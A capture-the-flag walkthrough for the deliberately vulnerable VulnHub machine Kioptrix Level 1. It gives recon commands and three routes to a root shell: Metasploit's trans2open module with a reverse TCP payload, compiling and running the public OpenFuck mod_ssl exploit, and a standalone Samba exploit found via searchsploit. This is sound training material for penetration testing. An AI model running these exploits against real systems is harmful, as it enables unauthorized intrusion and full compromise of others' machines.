# Day 13 🎯 Kioptrix Level 1 — Walkthrough

> A classic beginner CTF from VulnHub, great for OSCP prep.  
> **Goal:** Gain root access by any means possible.

---

## Table of Contents

- [Step 1: Discover the Target IP](#step-1-discover-the-target-ip)
- [Step 2: Nmap Scan](#step-2-nmap-scan-reconnaissance)
- [Step 3: Enumerate SMB](#step-3-enumerate-smb-samba)
- [Step 4: Nikto Scan](#step-4-run-a-nikto-scan-web-recon)
- [Step 5a: Exploit via Samba (Metasploit)](#step-5-exploitation--method-1-samba-trans2open-via-metasploit)
- [Step 5b: Exploit via OpenFuck](#step-5-exploitation--method-2-openfuck-modssl-exploit)
- [Step 5c: Exploit via Samba (Manual)](#step-5-exploitation--method-3-samba-without-metasploit)
- [Summary](#summary)
- [Key Takeaways](#key-takeaways)

---

## Step 1: Discover the Target IP

Use `netdiscover` or `arp-scan` to find the Kioptrix machine on your local network:

```bash
arp-scan -l
# or
netdiscover -i eth0 -r 192.168.1.0/24
```

> For this walkthrough, we'll assume the target IP is `192.168.1.31`.

---

## Step 2: Nmap Scan (Reconnaissance)

Run a full service/version scan:

```bash
nmap -sV -O -T4 192.168.1.31
```

**Key findings from Nmap:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 2.9p2 |
| 80   | HTTP    | Apache 1.3.20 |
| 139  | SMB     | Samba |
| 443  | HTTPS   | mod_ssl 2.8.4 |

---

## Step 3: Enumerate SMB (Samba)

```bash
nmblookup -A 192.168.1.31
smbclient -L \\KIOPTRIX -I 192.168.1.31 -N
```

This reveals **Samba 2.2.1a** is running — which is vulnerable to the **trans2open** exploit.

You can also use Metasploit to confirm the version:

```bash
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.31
run
```

---

## Step 4: Run a Nikto Scan (Web Recon)

```bash
nikto -h http://192.168.1.31
```

**Nikto reveals:**
- `mod_ssl/2.8.4` — vulnerable to a remote buffer overflow (**CVE-2002-0082**, also called **OpenFuck**)
- HTTP TRACE method is active (XST vulnerability)

---

## Step 5: Exploitation — Method 1: Samba (trans2open via Metasploit)

This is one of the easiest paths to root.

```bash
msfconsole
use exploit/linux/samba/trans2open
set RHOSTS 192.168.1.31
set payload linux/x86/shell/reverse_tcp
run
```

After a few attempts cycling return addresses, you'll get a shell. Verify root access:

```bash
id
# uid=0(root) gid=0(root) groups=99(nobody)
```

🎉 **Root achieved!**

---

## Step 5: Exploitation — Method 2: OpenFuck (mod_ssl exploit)

The version of Apache reported by Nmap is vulnerable to **CVE-2002-0082** (a.k.a OpenFuck).

Clone and compile the exploit:

```bash
git clone https://github.com/heltonWernik/OpenFuck.git
sudo apt install libssl-dev
gcc -o OpenFuck OpenFuck.c -lcrypto
chmod +x OpenFuck
```

Run it with the correct offset for RedHat/Apache 1.3.20:

```bash
./OpenFuck 0x6b 192.168.1.31 443 -c 40
```

This gives you a root shell directly — no privilege escalation needed.

🎉 **Root achieved!**

---

## Step 5: Exploitation — Method 3: Samba without Metasploit

There is a standalone Samba exploit that is equally effective. After running it in bruteforce mode against the target, it confirms Samba is running and drops you into a root shell — no Metasploit required.

Search for the exploit on Exploit-DB:

```bash
searchsploit samba 2.2
```

🎉 **Root achieved!**

---

## Summary

| Method | Vulnerability | Tool |
|--------|--------------|------|
| Samba trans2open | Samba 2.2.1a | Metasploit |
| OpenFuck | mod_ssl 2.8.4 / CVE-2002-0082 | Manual compile |
| Samba bruteforce | Samba 2.2.x | Standalone exploit |

---

## Key Takeaways

- Always start with **Nmap + Nikto** for recon
- Old software versions = easy wins; look up CVEs for everything
- Multiple paths to root are common in CTFs — try them all for learning
- This machine is a great intro to the methodology you'll use on **OSCP**

---

*Walkthrough covers Kioptrix Level 1 from VulnHub. For educational purposes only.*